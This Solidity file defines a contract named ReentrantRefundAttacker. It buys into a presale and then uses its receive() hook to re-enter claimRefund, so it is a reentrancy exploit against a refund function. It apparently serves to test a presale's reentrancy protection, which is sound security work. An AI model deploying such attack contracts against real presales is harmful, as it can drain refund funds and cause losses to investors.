// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IPresale {
    // Presale exposes buy(address recipient) external payable;
    function buy(address recipient) external payable;
    function claimRefund(address recipient) external;
}

interface IInfernoToken {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract ReentrantRefundAttacker {
    IPresale public immutable presale;
    IInfernoToken public immutable token;
    bool private _reentered;

    constructor(address presale_, address token_) {
        presale = IPresale(presale_);
        token = IInfernoToken(token_);
    }

    // When refunds transfer ETH to this contract, attempt to re-enter claimRefund
    receive() external payable {
        if (!_reentered) {
            _reentered = true;
            // call claimRefund on the presale contract (reentrancy attempt)
            presale.claimRefund(address(this));
        }
    }

    // Wrapper to call presale.buy and fund this contract
    function buyIntoPresale() external payable {
        presale.buy{value: msg.value}(address(this));
    }

    // Approve presale to pull tokens back for refund
    function prepareForRefund() external {
        uint256 balance = token.balanceOf(address(this));
        token.approve(address(presale), balance);
    }

    // Public trigger to start the refund reentrancy attempt
    function attackRefund() external {
        presale.claimRefund(address(this));
    }
}
